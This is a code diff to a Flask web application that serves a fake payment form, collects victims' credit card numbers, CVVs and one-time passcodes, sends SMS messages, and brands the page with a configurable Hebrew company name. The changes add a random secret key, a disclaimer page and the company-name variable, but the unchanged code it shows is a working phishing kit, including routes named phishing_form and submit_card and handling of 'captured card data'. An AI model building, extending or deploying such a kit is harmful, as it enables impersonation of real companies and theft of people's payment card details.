@@ -13,11 +13,11 @@ from typing import Optional, Dict, Any, Callable
 import os
 import threading
 import re
+import secrets
 
 app = Flask(__name__)
-app.secret_key = os.getenv('SECRET_KEY')
-if not app.secret_key:
-    raise ValueError("SECRET_KEY environment variable is required")
+# Generate a random secret key for each run since data is in-memory only
+app.secret_key = secrets.token_hex(32)
 
 # Enable CSRF protection
 csrf = CSRFProtect(app)
@@ -45,6 +45,11 @@ if not DEFAULT_SMS_MESSAGE:
     raise ValueError("DEFAULT_SMS_MESSAGE environment variable is required")
 # Convert literal \n to actual newlines for proper text formatting
 DEFAULT_SMS_MESSAGE = DEFAULT_SMS_MESSAGE.replace('\\n', '\n')
+
+# Company name in Hebrew - required from environment
+COMPANY_HEBREW = os.getenv('COMPANY_HEBREW')
+if not COMPANY_HEBREW:
+    raise ValueError("COMPANY_HEBREW environment variable is required")
 
 # Admin credentials - required from environment
 ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
@@ -173,10 +178,15 @@ def serve_logo():
     """Serve the logo image"""
     return send_file('logo.png', mimetype='image/png')
 
+@app.route('/disclaimer', methods=['GET'])
+def disclaimer():
+    """Show disclaimer page (informational only)"""
+    return render_template('disclaimer.html')
+
 @app.route('/', methods=['GET'])
 def phishing_form():
     """Serve the fake payment form"""
-    return render_template('phishing_form.html')
+    return render_template('phishing_form.html', company_hebrew=COMPANY_HEBREW)
 
 @app.route('/submit', methods=['POST'])
 def submit_card():
@@ -287,11 +297,12 @@ def verify_otp():
         # Calculate reference number from captured card data
         reference_number = "N/A"
         captured_data = get_captured_data()
-        if captured_data.get('card'):
+        card_data = captured_data.get('card')
+        if card_data:
             try:
                 # Extract card number and CVV (remove any non-digit characters)
-                card_number = re.sub(r'\D', '', captured_data['card'].get('card_number', ''))
-                cvv = re.sub(r'\D', '', captured_data['card'].get('cvv', ''))
+                card_number = re.sub(r'\D', '', card_data.get('card_number', ''))
+                cvv = re.sub(r'\D', '', card_data.get('cvv', ''))
 
                 if card_number and cvv:
                     # Calculate: (card_number + cvv) % 900000000 + 1000000000
@@ -307,7 +318,7 @@ def verify_otp():
         app.logger.error(f"Error in verify_otp: {str(e)}")
         return "An error occurred processing your request", 500
 
-    return render_template('verification_success.html', reference_number=reference_number)
+    return render_template('verification_success.html', reference_number=reference_number, company_hebrew=COMPANY_HEBREW)
 
 # SMS API Route
 @app.route('/send', methods=['POST'])
